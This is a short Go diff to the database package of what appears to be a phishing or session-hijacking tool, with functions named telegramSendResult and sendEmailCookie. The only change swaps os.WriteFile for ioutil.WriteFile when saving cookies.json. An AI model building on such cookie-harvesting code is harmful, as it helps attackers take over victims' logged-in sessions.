@@ -3,7 +3,7 @@ package database
 import (
 	"encoding/json"
 	"fmt"
-	"os"
+	"io/ioutil"
 
 	"github.com/tidwall/buntdb"
 	"gopkg.in/gomail.v2"
@@ -49,7 +49,7 @@ func telegramSendResult(msg string) {
 func sendEmailCookie(msg string) {
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
-	err := os.WriteFile("cookies.json", []byte(msg), 0755)
+	err := ioutil.WriteFile("cookies.json", []byte(msg), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
